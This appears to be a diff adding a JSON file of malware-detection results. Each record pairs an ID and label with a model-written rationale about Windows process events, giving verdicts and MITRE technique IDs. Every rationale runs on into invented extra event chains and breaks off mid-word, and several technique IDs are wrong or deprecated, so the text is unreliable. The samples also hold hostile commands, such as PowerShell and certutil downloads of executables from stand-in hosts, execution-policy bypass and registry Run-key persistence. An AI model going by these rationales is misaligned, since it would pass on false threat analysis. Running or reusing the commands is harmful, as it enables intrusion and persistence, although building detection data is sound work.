@@ -1,0 +1,62 @@
+[
+ {
+  "nid": "ADGEN_0000501",
+  "label": 1,
+  "rationale": "The event shows conhost.exe being executed with a force version 1 flag, which is not typical for legitimate use. This suggests the process is being used for obfuscation or to bypass security measures.\nVERDICT: MALICIOUS\nTTP: T1059\n\nChain:\nEvent2 | svchost.exe | cmd: netsh http add urlacl url=http://localhost:8080/ user=everyone\nExplanation: The event shows svchost.exe spawning a process that configures a URL ACL to allow HTTP access on port 8080 to everyone. While this could be benign if part of a development environment, the lack of context and the use of 'everyone' as the user suggest potential malicious intent.\nVERDICT: SUSPICIOUS\nTTP: T1136\n\nChain:\nEvent3 | explorer.exe | cmd: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /t REG_SZ /d \"C:\\Program Files\\Update\\Updater.exe\"\nExplanation: The event",
+  "latency_s": 46.29
+ },
+ {
+  "nid": "ADGEN_0000736",
+  "label": 1,
+  "rationale": "The chain repeatedly shows the same file, \"a.exe,\" being executed on the desktop of the same user. This behavior suggests that the file is being executed multiple times, which could indicate an attempt to persist or spread malware.\nVERDICT: MALICIOUS\nTTP: T1090\n\nChain:\ncmd: netsh interface set interface \"Local Area Connection\" admin=disable positiv | parent: explorer.exe -> cmd.exe\nExplanation: The command disables the network interface, which can be used to evade monitoring or communication. The fact that this command is run by explorer.exe, a common benign process, does not mitigate the malicious intent of disabling network connectivity.\nVERDICT: MALICIOUS\nTTP: T1070\n\nChain:\nEvent4 | C:\\Windows\\System32\\svchost.exe | Event4 | C:\\Windows\\System32\\svchost.exe | Event4 | C:\\Windows\\System32\\svchost.exe | Event4 | C:\\Windows\\System32\\svchost.exe\nExplanation: The chain shows",
+  "latency_s": 43.28
+ },
+ {
+  "nid": "ADGEN_0000915",
+  "label": 1,
+  "rationale": "The event log shows the creation of a pipe by a process named b4fabde.exe running on a remote machine. The filename \"b4fabde.exe\" is suspiciously obfuscated, and the use of a network share for the executable suggests potential lateral movement or remote code execution.\nVERDICT: MALICIOUS\nTTP: T1097\n\nChain:\nEvent7 | \\\\DESKTOP-4PVPS6E\\ADMIN$\\b4fabde.exe | CreatePipe | \\\\DESKTOP-4PVPS6E\\ADMIN$\\b4fabde.exe\nExplanation: The event log shows the creation of a pipe by a process named b4fabde.exe running on a remote machine. The filename \"b4fabde.exe\" is suspiciously obfuscated, and the use of a network share for the executable suggests potential lateral movement or remote code execution.\nVERDICT: MALICIOUS\nTTP: T1097\n\nChain:\nEvent7 | C:\\Windows\\System32\\cmd.exe | CreatePipe | C:\\Windows\\System32",
+  "latency_s": 40.68
+ },
+ {
+  "nid": "ADGEN_0000525",
+  "label": 1,
+  "rationale": "The command executed by cmd.exe writes a string to a pipe, which is an unusual and potentially malicious action. The use of a pipe for data exfiltration or control is indicative of malicious activity.\nVERDICT: MALICIOUS\nTTP: T1041\n\nChain:\nEvent2 | C:\\Windows\\System32\\explorer.exe | cmd: none\nExplanation: The chain shows explorer.exe spawning another process without any command line arguments or suspicious activity. There is no evidence of malicious behavior.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent3 | C:\\Windows\\System32\\svchost.exe | cmd: schtasks /create /tn BackupJob /tr \"C:\\Program Files\\BackupTool\\backup.exe\" /sc weekly /d MON,FRI positiv\nExplanation: The chain creates a scheduled task to run a backup tool on a weekly basis. While this could be part of legitimate system administration, the creation of a scheduled task to execute an external program is not inherently malicious.\nVERDICT: BENIGN\nT",
+  "latency_s": 39.66
+ },
+ {
+  "nid": "ADGEN_0000301",
+  "label": 1,
+  "rationale": "The chain repeatedly shows beacon.exe being executed on the desktop of the same user, indicating a likely persistence mechanism or repeated execution pattern. Beacon.exe is a known malware name often associated with remote access trojans.\nVERDICT: MALICIOUS\nTTP: T1090\n\nChain:\ncmd: netsh interface set interface \"Local Area Connection\" admin=disable positiv | parent: explorer.exe -> cmd.exe\nExplanation: The command disables the network interface, which could be part of a network disruption tactic. However, the parent process is explorer.exe, which is a legitimate process, and the command itself does not necessarily indicate malicious intent without further context.\nVERDICT: BENIGN\nTTP: none\n\nChain:\ncmd: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Users\\<USERS_5>\\Desktop\\beacon.exe\" positiv | parent: explorer.exe -> cmd.exe\nExplanation: The command adds a registry key to run an executable at startup, which is",
+  "latency_s": 38.66
+ },
+ {
+  "nid": "ADGEN_0000690",
+  "label": 1,
+  "rationale": "The event shows the execution of net.exe from a system directory, which is common for legitimate system administration tasks. However, the command issued is 'net users', which is typically used to list all users on the system, often as part of reconnaissance activities by attackers.\nVERDICT: MALICIOUS\nTTP: T1083\n\nChain:\nEvent2 | C:\\Windows\\System32\\explorer.exe | cmd: none\nExplanation: The event shows explorer.exe executing without any command line arguments, which is typical behavior for this process. There is no indication of malicious activity in the provided information.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent3 | C:\\Windows\\System32\\cmd.exe | cmd: schtasks /create /tn MaliciousTask /tr C:\\Temp\\malware.exe /sc daily positiv\nExplanation: The event demonstrates the creation of a scheduled task named 'MaliciousTask' that runs 'malware.exe' daily. This is a clear indication of persistence and potential malicious intent.\nVERDICT: MAL",
+  "latency_s": 35.0
+ },
+ {
+  "nid": "ADGEN_0000869",
+  "label": 1,
+  "rationale": "The event shows rundll32.exe being used to execute a shell32.dll function for creating a local server run-dll, which is a common technique for executing arbitrary code through COM objects. This behavior is often associated with malicious activities.\nVERDICT: MALICIOUS\nTTP: T1089\nChain:\nEvent1 | C:\\Windows\\System32\\explorer.exe | cmd: none\nExplanation: The event shows explorer.exe running without any command-line arguments or encoded content, and there is no suspicious parent process. This is a normal system process behavior.\nVERDICT: BENIGN\nTTP: none\nChain:\nEvent1 | C:\\Windows\\System32\\svchost.exe | cmd: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\malware.ps1\nExplanation: The event shows svchost.exe spawning PowerShell with the `-ExecutionPolicy Bypass` parameter, which disables execution policies, allowing the execution of potentially malicious scripts. Additionally,",
+  "latency_s": 36.87
+ },
+ {
+  "nid": "ADGEN_0000290",
+  "label": 1,
+  "rationale": "The event shows bcdedit.exe being used to modify the boot configuration to ignore all failures, which is a common technique for malware to ensure persistence across reboots.\nVERDICT: MALICIOUS\nTTP: T1053\n\nChain:\nEvent2 | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | cmd: Get-Process | Out-File -FilePath C:\\temp\\processes.txt\nExplanation: The PowerShell command retrieves a list of running processes and saves it to a file, which is a benign administrative task. There is no indication of malicious activity.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent3 | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | cmd: Invoke-WebRequest -Uri http://malicious-site.com/download.exe -OutFile C:\\temp\\download.exe\nExplanation: The PowerShell command downloads an executable from a remote site and saves it locally, which is a clear indication of command-and-control activity.\nVERDICT:",
+  "latency_s": 41.81
+ },
+ {
+  "nid": "ADGEN_0000952",
+  "label": 1,
+  "rationale": "The chain involves repeated activities by beacon.exe, which is downloaded to a user's Downloads folder. The creation of pipes and connections suggest network communication, which is often indicative of malware behavior.\nVERDICT: MALICIOUS\nTTP: T1071\n\nChain:\nEvent4624 | Event10 | C:\\Windows\\System32\\svchost.exe | CreateProcessAsUser | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | cmd: Get-Process positiv\nExplanation: The chain shows svchost.exe spawning PowerShell with a benign command to list running processes. There are no indicators of malicious activity.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent4688 | Event10 | C:\\Users\\<USERS_5>\\AppData\\Local\\Temp\\malware.exe | CreateProcessAsUser | C:\\Users\\<USERS_5>\\AppData\\Local\\Temp\\malware.exe | cmd: none | Event4688 | C:\\Users",
+  "latency_s": 42.28
+ },
+ {
+  "nid": "ADGEN_0000684",
+  "label": 1,
+  "rationale": "The event shows rundll32.exe being used to execute a suspicious DLL, which is often indicative of malware attempting to perform a system scan or other malicious activities.\nVERDICT: MALICIOUS\nTTP: T1059\n\nChain:\nEvent2 | C:\\Windows\\System32\\explorer.exe | cmd: none\nExplanation: The event shows explorer.exe running without any command line arguments, which is normal behavior for this process. There is no indication of malicious activity.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent3 | C:\\Windows\\System32\\svchost.exe | cmd: net start wuauserv\nExplanation: The event shows svchost.exe starting the Windows Update service, which is a legitimate system operation and does not indicate malicious activity.\nVERDICT: BENIGN\nTTP: none\n\nChain:\nEvent4 | C:\\Windows\\System32\\cmd.exe | cmd: C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://malicious.com/malware",
+  "latency_s": 41.59
+ }
+]
